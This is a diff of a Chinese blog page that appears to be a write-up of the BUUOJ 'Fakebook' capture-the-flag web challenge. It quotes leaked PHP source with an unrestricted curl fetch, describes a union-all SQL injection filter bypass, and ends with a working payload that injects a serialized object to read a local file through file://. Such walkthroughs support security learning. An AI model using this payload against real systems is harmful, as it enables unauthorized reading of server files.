@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>buuoj系列:Fakebookwp | WMH-I-MJN</title>
+  <title>buuoj系列:Fakebook-wp | WMH-I-MJN</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1 之后查看了一下robots.txt，发现user.php.bak。把源码下载下来，如下：12345678910111213141516171819202122232425262728293031323334353637383940414243">
+  <meta name="description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuoj系列:Fakebookwp">
+<meta property="og:title" content="buuoj系列:Fakebook-wp">
 <meta property="og:url" content="http://yoursite.com/2019/10/10/buuoj系列-Fakebookwp/index.html">
 <meta property="og:site_name" content="WMH-I-MJN">
-<meta property="og:description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1 之后查看了一下robots.txt，发现user.php.bak。把源码下载下来，如下：12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta property="og:description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-10T09:07:46.658Z">
+<meta property="og:updated_time" content="2019-10-10T09:16:00.328Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="buuoj系列:Fakebookwp">
-<meta name="twitter:description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1 之后查看了一下robots.txt，发现user.php.bak。把源码下载下来，如下：12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta name="twitter:title" content="buuoj系列:Fakebook-wp">
+<meta name="twitter:description" content="buuoj_web_Fakebook首先打开网页，先注册一个账户，信息随便填。登陆之后发现username字段是一个链接，点击指向view.php?no=1">
   
     <link rel="alternative" href="/atom.xml" title="WMH-I-MJN" type="application/atom+xml">
   
@@ -157,7 +157,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      buuoj系列:Fakebookwp
+      buuoj系列:Fakebook-wp
     </h1>
   
 
@@ -171,6 +171,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="buuoj-web-Fakebook"><a href="#buuoj-web-Fakebook" class="headerlink" title="buuoj_web_Fakebook"></a>buuoj_web_Fakebook</h1><p>首先打开网页，先注册一个账户，信息随便填。<br>登陆之后发现username字段是一个链接，点击指向view.php?no=1</p>
+<a id="more"></a>
 <p>之后查看了一下robots.txt，发现user.php.bak。把源码下载下来，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>回到view.php,先order by看一下表的列数,为4。然后就是正常的union注入，file协议读文件。但是union被过滤，这里使用union all绕过。<br>根据报错可知,view.php路径为/var/www/html/view.php,且需要传入序列化对象。<br>最后的payload是</p>
 <p><code>view.php?no=0%20union%20all%20select%201,2,3,%27O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;hfs&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}%27</code></p>
